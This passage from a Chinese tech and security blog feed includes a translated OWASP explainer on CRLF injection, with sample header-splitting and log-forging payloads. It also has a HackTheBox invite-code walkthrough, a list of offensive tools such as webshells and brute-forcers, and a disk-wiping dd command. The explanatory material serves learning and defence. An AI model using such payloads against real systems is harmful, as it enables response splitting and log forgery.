3、写入启动扇区<code>sudo dd if=/dev/zero of=/dev/disk2 bs=1024 count=1024</code><br/>
4、对磁盘进行分区<code>diskutil partitionDisk disk2 GPT JHFS+ &quot;AWESOME DISK&quot; 0g</code><br/>
5、打完收工，写博客发出来。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[90后空巢青年生活指南]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15488284836388.html"/>
    <updated>2019-01-30T14:08:03+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15488284836388.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>你永远不知道下一秒会发生什么，所以赶紧珍惜现在吧。</p>
</blockquote>

<h1 id="toc_0">生活习惯篇</h1>

<h2 id="toc_1">多喝热水</h2>

<p>不止&quot;女人是水做的&quot;，男人也是。人体70%是的成分是水。<br/>
多喝水可以减肥、缓解皮肤干燥、排毒除痘、缓解眼睛疲劳等。多喝水还能治疗肾结石。</p>

<h2 id="toc_2">不要久坐</h2>

<p>久坐和喝水少一样危害巨大，因此不可久坐。每坐一个小时就起来走动顺便喝点水吧。</p>

<h2 id="toc_3">给物品定位</h2>

<p>将各类常用物品找一个固定的位置，每次取用后将其放回原处，同时记录每一件物品。掌握自己的生活从掌握自己有多少物品开始。</p>

<h2 id="toc_4">常清洁</h2>

<p>拒绝&quot;仓鼠症&quot;，不要囤积物品。制定房屋打扫计划，经常打扫、整理房间。<br/>
学习&quot;断舍离&quot;</p>

<h2 id="toc_5">注意个人护理</h2>

<p>包括美容养颜、强身健体、预防疾病、个人卫生等。</p>

<h2 id="toc_6">迈开腿管住嘴</h2>

<p>吃饭只吃八分饱，不可贪食吃十分。<br/>
经常出门走走，有利身心健康。看看展馆、游玩山水。工作修炼的是技术、出门修的是身心。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[给网站添加百度、谷歌搜索框]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15487463359475.html"/>
    <updated>2019-01-29T15:18:55+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15487463359475.html</id>
    <content type="html"><![CDATA[
<p>以下是我北斗页面的搜索框代码：</p>

<pre class="line-numbers"><code class="language-markup"> &lt;div style=&#39;overflow:auto&#39;&gt;&lt;form onsubmit=&quot;return baiduWithHttps(this)&quot; action=&quot;http://www.baidu.com/s&quot; target=&quot;_blank&quot;&gt;
        &lt;input class=&#39;bdtext&#39; type=&quot;text&quot;  onfocus=&quot;checkHttps&quot; name=&quot;wd&quot;  size=&quot;30&quot;&gt;&lt;input class=&#39;bdbtn&#39; type=&quot;submit&quot;value=&quot;百度搜索&quot;&gt;
        &lt;/form&gt;&lt;script&gt;function checkHttps () {
                BaiduHttps.useHttps();    
            };
            function baiduWithHttps (formname) {
                var data = BaiduHttps.useHttps();
                if (data.s === 0) {
                    return true;
                }
                else {
                    formname.action = &#39;https://www.baidu.com/s&#39; + &#39;?wd&#39; + data.ssl_code;
                    return true;
                }
            };&lt;/script&gt;&lt;/div&gt;&lt;div style=&#39;overflow:auto&#39;&gt;&lt;form onsubmit=&quot;return googleWithHttps(this)&quot; action=&quot;http://www.google.com/search&quot; target=&quot;_blank&quot;&gt;
    &lt;input class=&#39;bdtext&#39; type=&quot;text&quot;  onfocus=&quot;checkHttps&quot; name=&quot;q&quot;  size=&quot;30&quot;&gt;&lt;input class=&#39;bdbtn&#39; type=&quot;submit&quot;value=&quot;谷歌搜索&quot;&gt;
    &lt;/form&gt;&lt;script&gt;function checkHttps () {
            googleHttps.useHttps();    
        };
        function googleWithHttps (formname) {
            var data = googleHttps.useHttps();
            if (data.s === 0) {
                return true;
            }
            else {
                formname.action = &#39;https://www.google.com/search&#39; + &#39;?q&#39; + data.ssl_code;
                return true;
            }
        };&lt;/script&gt;&lt;/div&gt;
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Snipaste 无法在 Mac 上截图的解决办法]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15484074464554.html"/>
    <updated>2019-01-25T17:10:46+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15484074464554.html</id>
    <content type="html"><![CDATA[
<p>MacOSX 版本：Mojave 10.14.2<br/>
Snipaste 版本：1.16.2</p>

<p>以下列出遇到部分问题：<br/>
1、使用截图功能，手动画矩形框，但是选定框画完后松开触摸板，选定框自动消失，导致无法截图。（手动选定截图区域占截图使用时间99%）<br/>
2、使用截图功能，程序自动识别截图区域，双击可以得到截图并且有箭头等选项，画一个箭头后，选定框自动消失，截图会带着箭头自动保存到图片目录。（这导致没法多画几个箭头，也没法另存为图片）</p>

<h1 id="toc_0">解决办法</h1>

<p>我后来在 <a href="https://github.com/Snipaste/feedback/issues/1012">https://github.com/Snipaste/feedback/issues/1012</a> 这里找到了答案。<br/>
关闭欧路词典的划词翻译功能，即可正常使用截图。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[更优雅的使用Hexo写博客]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491239.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491239.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>曾经的博客是使用 Hexo 写的，我觉得Hexo这种在文章前面写上元信息的方式很棒。然而，每此写markdown文档都要输入这些元信息，这很麻烦，所以就写了个shell脚本来自动化输入文件元信息的过程。<br/>
代码如下：</p>
</blockquote>

<pre class="line-numbers"><code class="language-bash">#!/bin/bash

printf &quot;请输入文件名(example.md)，记得写后缀!\n&quot;
read -p &quot;文件名是: &quot; filename
# 这里的title取文件名不取后缀
echo &quot;title: &quot;${filename%.*} &gt;&gt; $filename
echo &quot;author: lonelyor&quot; &gt;&gt; $filename
echo &quot;language: zh-CN&quot; &gt;&gt; $filename
echo &quot;tags:&quot; &gt;&gt; $filename
echo &quot;  - 标签&quot; &gt;&gt; $filename
echo &quot;categories:&quot; &gt;&gt; $filename
echo &quot;  - 分类&quot; &gt;&gt; $filename
time=$(date &quot;+%Y-%m-%d %H:%M:%S&quot;)
echo &quot;date: ${time}&quot;&gt;&gt; $filename
echo &quot;---&quot; &gt;&gt; $filename
echo &quot;&gt; description: &quot; &gt;&gt; $filename
# printf和echo都是输出，&gt;&gt;表示追加，&gt;会覆盖文件
# shell中使用变量需要先定义变量，然后使用时加 $
# read 用来创建文件，文件名从终端获取
</code></pre>

<p>展示效果如下:</p>

<pre class="line-numbers"><code class="language-md">title: 如何优雅的创建markdown文件
author: lonelyor
language: zh-CN
tags:
  - Hexo
  - markdown
categories:
  - 技术杂文
date: 2018-09-06 17:42:40
---
&gt; description: 若爱请深爱，若不爱请离开。
</code></pre>

<p>接下来说说如何使用(仅限linux、macos，或者说可以执行bash的环境，win用户请自行转换成bat)：<br/>
首先，创建一个名叫 md.sh 的文件（名字你爱咋咋地），把代码copy进去。<br/>
然后，<code>ln -s /md文件绝对路径 /usr/local/bin/md</code> ,这条语句的意思就是创建一个软连接，把 md.sh 连接到当前用户的 md 命令上。<br/>
最后，打开终端输入 md ，然后输入要创建的markdown文件名（如：test.md），即可在当前目录下创建带有元信息的markdown文件。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CRLF注入]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491221.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491221.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>文章翻译自OWASP的<a href="https://www.owasp.org/index.php/CRLF_Injection">CRLF_Injection</a></p>
</blockquote>

<p>CRLF即回车Carriage Return (ASCII 13, \r) 和 换行 Line Feed (ASCII 10, \n)。他们被用于注释掉一行的终止。不过不同系统的处理方式有点不同。windows中，CR和LF都被用于注释掉一行的结尾，而linux/unix中只需要一个LF。在HTTP协议中，CRLF序列始终用于一行的终止。<br/>
当用户设法将CRLF提交到应用程序时，可能发生CRLF注入攻击，这通常是通过修改HTTP参数或URL来完成。</p>

<p>CRLF注入可能产生这样的问题：</p>

<ul>
<li>HTTP响应拆分</li>
<li>日志注入<br/>
## HTTP响应拆分<br/>
通常，当出现以下情况时会发生HTTP响应拆分</li>
<li>数据通过不受信任的来源进入Web应用程序，如HTTP请求。</li>
<li>数据包含在发送给Web用户的HTTP响应标头中，而不会对恶意字符进行验证。<br/>
HTTP响应拆分是达到目的的手段而不是目的本身。<br/>
攻击方式如下：攻击者将恶意数据传递给易受攻击的应用程序，应用程序将数据包含在HTTP响应中。<br/>
要成功利用漏洞，应用程序必须允许<strong>包含有 CR（回车，即 %0d 或者 \r\n）和 LF（换行符，%0a 或者 \n）的输入在header中</strong>和<strong>底层平台必须容易注入这样的字符</strong>。</li>
</ul>

<p><em>大多数现代应用程序服务器(无论用什么语言编写的代码)，都已经不存在HTTP响应拆分漏洞。</em></p>

<p>下面上一段java代码来举例说明：</p>

<pre class="line-numbers"><code class="language-java">String author = request.getParameter(AUTHOR_PARAM);
...
Cookie cookie = new Cookie(&quot;author&quot;, author);
      cookie.setMaxAge(cookieExpiration);
      response.addCookie(cookie);
</code></pre>

<p>上述代码的意思是：从客户端HTTP请求中接受参数（author），并将其设置在HTTP响应的cookie头中。<br/>
如果我们正常提交数据(author=lonelyor)，HTTP响应应该是这样：</p>

<pre class="line-numbers"><code class="language-java">HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...
</code></pre>

<p>但是，由于源代码中的cookie是由未经验证的用户输入组成的，因此如果我们提交恶意代码<code>Hacker By xxx\r\nContent-Length:45\r\n\r\n...</code>则HTTP响应将被拆分为原始响应和伪造响应。</p>

<pre class="line-numbers"><code class="language-java">HTTP/1.1 200 OK
    ...
    Set-Cookie: author=Hacker By xxx
    Content-Length: 999
    
    &lt;html&gt;恶意内容...&lt;/html&gt; (这个例子中为第999个字符)
    原始内容以1000开头, 现在被浏览器忽略了...
</code></pre>

<h3 id="toc_0">危害</h3>

<p>攻击者构建任意HTTP响应的能力可能导致以下攻击：<br/>
跨用户污染（Cross-User_Defacement）——利用条件很苛刻<br/>
缓存中毒（Cache_Poisoning）——利用条件很苛刻<br/>
XSS跨站脚本攻击<br/>
页面劫持</p>

<h2 id="toc_1">日志注入</h2>

<p>将未经验证的用户输入写入日志文件可能导致攻击者伪造日志或者将恶意内容注入日志。<br/>
以下情况可能导致日志伪造漏洞：</p>

<ul>
<li>数据从不受信任的来源进入应用程序</li>
<li>数据将写入应用程序或者系统日志文件</li>
</ul>

<p>下面上一段java代码来举例说明：</p>

<pre class="line-numbers"><code class="language-java">...
String val = request.getParameter(&quot;val&quot;);
try {
  int value = Integer.parseInt(val);
}
catch (NumberFormatException) {
  log.info(&quot;Failed to parse val = &quot; + val);
}
...
</code></pre>

<p>上述代码的功能是，从请求对象中读取整数值，如果该值无法解析为整数，则会记录输入，并显示一条错误信息。<br/>
如果用户提交字符串“one”，则会记录以下条目<br/>
<code>INFO: Failed to parse val=one</code><br/>
然而，如果攻击者提交字符串<code>one%0a%0aINFO:+User+logged+out%3dbadguy</code>则会在日志中显示：</p>

<pre class="line-numbers"><code class="language-text">    INFO: Failed to parse val=one

    INFO: User logged out=badguy
</code></pre>

<p>显然攻击者可以使用相同机制插入任意日志条目。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux将shell脚本添加到系统命令的方法]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491201.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491201.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>可以自定义一些shell脚本，用来提高执行常用组合命令的效率。还有一种方式是使用alias命令。</p>
</blockquote>

<p>两种方法：<br/>
1、直接把shell脚本放到/usr/local/bin ，然后添加权限 <code>sudo chmod +x xxx.sh</code> 就ok了。这样是在本地用户添加命令。<br/>
root用户添加命令则把脚本放在 /usr/bin 即可。<br/>
2、使用软连接的方式<code>ln -s 【源文件或目录】【目标文件或目录】</code><br/>
注意要使用绝对路径。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[windows右键添加管理员获得所有权]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491180.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491180.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>右键添加获得管理员所有权是个比较方便的功能。</p>
</blockquote>

<p>打开记事本或者别的文本编辑器，然后写入如下内容:</p>

<pre class="line-numbers"><code class="language-cmd">Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\*\shell\runas]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\*\shell\runas\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
[HKEY_CLASSES_ROOT\exefile\shell\runas2]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\exefile\shell\runas2\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
[HKEY_CLASSES_ROOT\Directory\shell\runas]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\Directory\shell\runas\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;
</code></pre>

<p>然后另存为：管理员获得所有权.reg<br/>
文件名可以随便写，但是后缀记得写成reg（改成这个后缀后文件图标就会变成一个破碎蓝色魔方）。<br/>
然后右键以管理员身份运行，若弹框注册表xxx的，同意就行了。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[burpsuite设置上游代理]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491162.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491162.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>burpsuite的使用技巧之一，设置上游代理。比如测试境外网站时可能需要[fanqiang]才能访问，此时这个技巧就能用得上了。</p>
</blockquote>

<p><img src="http://images.lonelyor.org/burp%E8%AE%BE%E7%BD%AE%E4%B8%8A%E6%B8%B8%E4%BB%A3%E7%90%8620180823161146.png" alt="burp设置上游代理20180823161146"/></p>

<p>1、在浏览器中设置burp代理以保证可以抓包<br/>
2、开启上游代理<br/>
3、在burp的图中所示位置设置上游代理</p>

<p>打完收工</p>

<h2 id="toc_0">参考链接</h2>

<p><a href="http://www.360zhijia.com/360anquanke/191737.html">http://www.360zhijia.com/360anquanke/191737.html</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[FOEENSICS 101]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491124.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491124.html</id>
    <content type="html"><![CDATA[
<p>题目：<a href="https://ctflearn.com/problems/96">https://ctflearn.com/problems/96</a><br/>
<img src="http://images.lonelyor.org/ctflearn-96-1.png" alt="ctflearn-96-1"/><br/>
访问域名，然后会下载一张图片。<br/>
接下来我们使用十六进制编码器打开这张图片，会发现：<br/>
<img src="http://images.lonelyor.org/ctflearn-96-2.png" alt="ctflearn-96-2"/><br/>
标红部分即是flag。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[JavaScript基础]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045491003.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045491003.html</id>
    <content type="html"><![CDATA[
<p>JavaScript是一种脚本编程语言。<br/>
JavaScript运行顺序是从上往下，因此要注意代码的顺序。</p>

<h2 id="toc_0">如何使用JavaScript</h2>

<p>内部JavaScript：在html页面中嵌入<code>&lt;script&gt;这里写js代码&lt;/script&gt;</code>即可插入js代码。<br/>
外部JavaScript：<code>&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;</code>可以调用html文件同级目录下的script.js文件。</p>

<h2 id="toc_1">注释</h2>

<p><code>// 这是单行注释</code><br/>
<code>/* 这是多行注释 */</code></p>

<h2 id="toc_2">变量</h2>

<p>var用来定义变量</p>

<h2 id="toc_3">函数</h2>

<p>function funName(){<br/>
    js代码<br/>
}<br/>
函数是可复用的代码块，可以一次编写反复使用。</p>

<h2 id="toc_4">运算符</h2>

<p><code>+</code>、<code>-</code>、<code>*</code>、<code>/</code> 分别是加减乘除<br/>
<code>===</code>、<code>!==</code>、<code>&lt;</code>、<code>&gt;</code> 分别是等于、不等于、小于、大于<br/>
<code>&amp;&amp;</code>、<code>||</code>、<code>!</code> 分别表示与、或、非</p>

<h2 id="toc_5">条件语句</h2>

<p>if(条件){<br/>
    js代码<br/>
} else {<br/>
    js代码<br/>
}</p>

<h2 id="toc_6">事件</h2>

<p>事件相关函数分为：事件监听器和事件处理器 </p>

<h2 id="toc_7">循环</h2>

<p>for(起式值；退出条件；增加器){<br/>
    js代码<br/>
}</p>

<h2 id="toc_8">switch语句</h2>

<p>switch - 他们以单个表达式/值作为输入，然后查看多个选项，直到找到与该值相匹配的选项，执行与之相关的代码。</p>

<pre class="line-numbers"><code class="language-javascript">switch (expression) {
  case choice1:
    run this code
    break;

  case choice2:
    run this code instead
    break;
    
  // include as many cases as you like

  default:
    actually, just run this code
}
</code></pre>

<h2 id="toc_9">写一个猜数字的小游戏</h2>

<p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/First_steps/A_first_splash#%E7%8C%9C%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F">猜数字游戏</a></p>

<p>未完待续...</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[hackthebox邀请码]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490967.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490967.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>不打算好好玩的麻烦不要瞎注册，大量的垃圾账号只会污染整个生态环境。</p>
</blockquote>

<p>进入注册页面，观察页面js文件会找到以下内容：</p>

<pre class="line-numbers"><code class="language-javascript">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\&#39;/d/e/k/l/m\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;,24,24,&#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;.split(&#39;|&#39;),0,{}))
</code></pre>

<p>1、然后把这段代码放到 <a href="http://jsbeautifier.org/">http://jsbeautifier.org/</a> 进行美化，得出：<br/>
2、</p>

<pre class="line-numbers"><code class="language-javascript">function verifyInviteCode(code) {
    var formData = {
        &quot;code&quot;: code
    };
    $.ajax({
        type: &quot;POST&quot;,
        dataType: &quot;json&quot;,
        data: formData,
        url: &#39;/api/invite/verify&#39;,
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: &quot;POST&quot;,
        dataType: &quot;json&quot;,
        url: &#39;/api/invite/how/to/generate&#39;,
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
</code></pre>

<p>可以看出上述代码是让我们访问：<a href="https://www.hackthebox.eu/api/invite/generate">https://www.hackthebox.eu/api/invite/generate</a><br/>
然后修改请求方式为post<br/>
于是就得到了：</p>

<pre class="line-numbers"><code class="language-javascript">{&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;VlJQS1QtQUNXRUstT0tYREwtQ0lZQVUtS0NZSlU=&quot;,&quot;format&quot;:&quot;encoded&quot;},&quot;0&quot;:200}
</code></pre>

<p>将code进行base64解码，就得到了邀请码。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Web安全工程师求职清单]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490948.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490948.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>一年前写的一点玩意，没什么卵用</p>
</blockquote>

<h2 id="toc_0">安全资讯</h2>

<p><a href="http://www.freebuf.com/">freebuf</a></p>

<p><a href="https://www.t00ls.net/">tools</a></p>

<p><a href="https://www.secpulse.com/">安全脉搏</a></p>

<p><a href="https://packetstormsecurity.com/">数据包风暴</a></p>

<p><a href="http://www.4hou.com/">嘶吼</a></p>

<p><a href="https://www.aqniu.com/">安全牛</a></p>

<p><a href="https://www.anquanke.com/">安全客</a></p>

<p><a href="https://www.sec-wiki.com/">sec-wiki</a></p>

<p><a href="http://www.secdoctor.com/">中国信息安全博士网</a></p>

<h2 id="toc_1">威胁情报</h2>

<p>暂略</p>

<h2 id="toc_2">安全工具</h2>

<p><a href="https://www.ctftools.com/down/">最强安全工具集</a></p>

<ul>
<li>burpsuite(抓包)</li>
<li>sqlmap(sql注入)</li>
<li>whireshark(网络抓包)</li>
<li>中国菜刀(webshell、一句话后门)</li>
<li>HxD(十六进制编辑器和磁盘编辑器)</li>
<li>nmap(扫描)</li>
<li>hydra(爆破)</li>
<li>cain(爆破)</li>
<li>metasploit(漏洞利用)</li>
<li>mitmproxy(http/https代理)</li>
<li>commix(命令注入)</li>
<li>httrack(网站克隆)</li>
<li>netcat(瑞士军刀-网络调试和探测工具)</li>
<li>scapy(python的交互式数据包操作程序和库)</li>
<li>empire(域渗透)</li>
</ul>

<h2 id="toc_3">靶机环境</h2>

<h2 id="toc_4">安全知识库</h2>

<p><a href="https://www.anquanquan.info/">安全圈</a></p>

<p><a href="http://wiki.open.qq.com/wiki/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83">腾讯安全开发规范</a></p>

<p><a href="https://highon.coffee/blog/cheat-sheet/">安全研究备忘单</a></p>

<p><a href="https://portswigger.net/kb/issues">Burp漏洞定义</a></p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">MSF框架终极指南</a></p>

<p><a href="https://www.owasp.org/index.php/Main_Page">OWASP</a></p>

<p><a href="http://vipread.com/index">vipread知识库</a></p>

<p><a href="https://kb.help.rapid7.com/docs/">Rapid7知识库</a></p>

<p><a href="https://kernelnewbies.org/">linux内核研究</a></p>

<p><a href="http://www.loner.fm/bugs/">乌云漏洞</a></p>

<p><a href="https://wooyun.js.org/">乌云文章</a></p>

<p><a href="http://www.office-cn.net/t/api/index.html?web.htm">WindowsAPI参考手册</a></p>

<p><a href="https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology">Burp方法论</a></p>

<p><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF-Wiki</a></p>

<p><a href="https://github.com/ctfs/">CTFs</a></p>

<p><a href="https://ctftime.org">ctftime</a></p>

<p><a href="https://www.codesec.net/">代码安全</a></p>

<p><a href="https://silic.wiki/doku.php">习科小黑板</a></p>

<p><a href="https://bbs.safewiki.org/portal.php">安全文库</a></p>

<p><a href="http://webscan.360.cn/vul">360网站常见漏洞</a></p>

<h2 id="toc_5">漏洞平台</h2>

<p><a href="https://butian.360.cn/">补天</a></p>

<p><a href="https://www.vulbox.com/">漏洞盒子</a></p>

<p><a href="https://www.bugbank.cn/">漏洞银行</a></p>

<p><a href="http://www.cnvd.org.cn/">CNVD国家信息安全漏洞共享平台</a></p>

<p><a href="https://src.edu-info.edu.cn/">教育行业漏洞报告平台</a></p>

<p><a href="https://www.seebug.org">Seebug</a></p>

<p><a href="http://0xsafe.org/vuldb.html">Vuldbs漏洞平台</a></p>

<h2 id="toc_6">技能要求</h2>

<ul>
<li>不同场景下的渗透测试流程、方法</li>
<li>常见漏洞的攻击方法和防御方法</li>
<li>代码级白盒测试能力</li>
<li>owasp_top10概念、原理、测试方法、防御方法</li>
<li>主流防火墙、IDS、IPS、漏洞扫描工具的安装、使用方法</li>
<li>熟悉python、php、javascript、c、c++等语言的一种或多种</li>
<li>cissp之类的证书或ctf解题能力是加分项</li>
<li>各种靶机环境搭建</li>
<li>安全分析报告的编写</li>
<li>对业务快速熟悉的能力（业务安全重点、应用范围划分、业务安全基线）</li>
<li>spring、struts、hibernate框架安全相关</li>
<li>web组件加固、服务器加固、数据库加固</li>
<li>域渗透、dns、arp等内网渗透知识</li>
<li>各类提权如系统提权、数据库提权等</li>
<li>风险评估、等级保护、安全体系规划、安全体系建设。包括信息资产管理、安全威胁和风险评估、安全解决方案制定、信息安全体系实施</li>
<li>Nginx、Apache、Tomcat等安全配置基线</li>
<li>各类安全测试标准(ISSAF、OSSTMM、OWASP、微软SDLC、OPENSAMM、BSIMM、SSECMM)</li>
<li>网络日志分析、攻击流量检测</li>
<li>hadoop、openstack、sdn云安全</li>
<li>mongodb、redis、HBASE等nosql安全</li>
<li>burpsuite插件编写</li>
<li>python脚本开发能力、shell脚本开发能力</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[burpsuite插件编写之官方代码示例解读]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490884.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490884.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>description: 分析burpsuite官方提供的示例代码，以此来学习插件编写。</p>
</blockquote>

<h2 id="toc_0">HelloWorld</h2>

<p>废话不多说，直接上代码！</p>

<pre class="line-numbers"><code class="language-python">from burp import IBurpExtender
from java.io import PrintWriter
from java.lang import RuntimeException

# 上面import的第一句是所有burp插件都必须有的
# 下面开始创建一个burp插件的类来实现插件
class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        # 创建插件名
        callbacks.setExtensionName(&quot;HelloWorld extension&quot;)
        # 获取输出和错误流
        stdout = PrintWriter(callbacks.getStdout(), True)
        stderr = PrintWriter(callbacks.getStderr(), True)
        # 在输出流和错误流中插入消息
        stdout.println(&quot;Hello output&quot;)
        stderr.println(&quot;Hello errors&quot;)
        # 将消息插入burp的alert警报标签中
        callbacks.issueAlert(&quot;Hello alerts&quot;)
        # 抛出将出现在错误流中的异常
        raise RuntimeException(&quot;Hello exception&quot;)
</code></pre>

<p>现在开始来说几个坑：<br/>
1、插件最好尽量放在英文路径，不然可能会报错<br/>
2、编写代码前指定编码(如：# -<em>- coding:utf8 -</em>-)<br/>
3、raise RuntimeException(&quot;Hello exception&quot;) 这行代码我没看懂是要干嘛的，反正写了之后Errors就报错，不想看的话就注释掉好了。</p>

<h2 id="toc_1">event_listeners 事件监听器</h2>

<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
# -*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IHttpListener
from burp import IProxyListener
from burp import IScannerListener
from burp import IExtensionStateListener
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IHttpListener, IProxyListener, IScannerListener, IExtensionStateListener):
    def registerExtenderCallbacks(self, callbacks):
        # 保持对回调对象的引用
        self._callbacks = callbacks
        # 创建插件名
        callbacks.setExtensionName(&quot;Event Listeners&quot;)
        # 获取输出流
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        # 注册为http监听器
        callbacks.registerHttpListener(self)
        # 注册为proxy监听器
        callbacks.registerProxyListener(self)
        # 注册为scanner监听器
        callbacks.registerScannerListener(self)
        # 注册为扩展插件状态监听器
        callbacks.registerExtensionStateListener(self)
    # 下面几个函数各自实现监听
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        self._stdout.println(
            (&quot;HTTP request to &quot; if messageIsRequest else &quot;HTTP response from&quot;) +
            messageInfo.getHttpService().toString() +
            &quot;[&quot; + self._callbacks.getToolName(toolFlag) + &quot;]&quot;
        )

    def processProxyMessage(self, messageIsRequest, message):
        self._stdout.println(
            (&quot;Proxy request to &quot; if messageIsRequest else &quot;Proxy response from&quot;) +
            message.getMessageInfo.getHTTPService().toString()
        )

    def newScanIssue(self, issue):
        self._stdout.prinln(&quot;New scan issue &quot; + issue.getIssueName())

    def extensionUnloaded(self):
